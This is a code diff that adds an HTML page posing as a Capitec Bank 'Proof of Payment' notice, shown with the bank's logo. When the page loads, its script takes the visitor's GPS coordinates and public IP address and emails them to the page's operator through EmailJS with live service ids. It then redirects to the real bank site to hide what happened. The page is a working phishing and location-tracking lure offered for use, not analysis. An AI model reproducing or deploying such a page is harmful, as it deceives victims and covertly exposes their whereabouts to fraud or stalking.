@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proof of Payment</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh; /* Full height of viewport */
+            margin: 0;
+            background-color: #f0f0f0; /* Light background color */
+        }
+        img {
+            max-width: 300px; /* Adjust logo size */
+            margin-bottom: 20px; /* Space below logo */
+        }
+        h1 {
+            font-size: 2em; /* Larger font for title */
+            margin: 0;
+        }
+        p {
+            font-size: 1em; /* Smaller font for subtitle */
+            margin: 5px 0 20px; /* Space around subtitle */
+        }
+        /* Throbber style */
+        .throbber {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 5px solid #ccc;
+            border-top-color: #007bff; /* Capitec color */
+            animation: spin 1s linear infinite;
+            margin-top: 15px; /* Space above throbber */
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Logo wrapped in an anchor tag for redirection -->
+    <a href="https://www.capitecbank.co.za/">
+        <img src="https://cdn.freelogovectors.net/wp-content/uploads/2020/09/capitec-logo.png" alt="Logo">
+    </a>
+
+    <!-- Text Content -->
+    <h1>Proof of Payment</h1>
+    <p>Please enable location to view</p>
+
+    <!-- Throbber -->
+    <div class="throbber"></div>
+
+    <script>
+        (function() {
+            emailjs.init("1BBa5cU_t-aXTE9d8"); // Replace with your EmailJS public key
+        })();
+
+        function getLocation() {
+            // Fetch the IP address when the page loads
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    console.log("IP Address:", ipAddress); // Log IP address
+                })
+                .catch(error => console.error("Error fetching IP address:", error));
+
+            // Get GPS location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+
+            // Fetch the IP address again to include in the email
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+
+                    const templateParams = {
+                        latitude: lat,
+                        longitude: lng,
+                        ip_address: ipAddress, // Include IP address in the email
+                        to_name: 'Recipient Name', // Change as needed
+                        from_name: 'Your Name', // Change as needed
+                        message: 'Here is my GPS location and IP address.'
+                    };
+
+                    emailjs.send('service_79zgaqg', 'template_56xx4ux', templateParams)
+                        .then((response) => {
+                            console.log('SUCCESS!', response.status, response.text);
+                            window.location.href = "https://www.capitecbank.co.za/"; // Redirect after sending email
+                        }, (error) => {
+                            console.error('FAILED...', error);
+                        });
+                })
+                .catch(error => console.error("Error fetching IP address:", error));
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    console.error("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    console.error("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    console.error("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    console.error("An unknown error occurred.");
+                    break;
+            }
+        }
+
+        // Automatically call getLocation when the page loads
+        window.onload = getLocation;
+    </script>
+</body>
+</html>
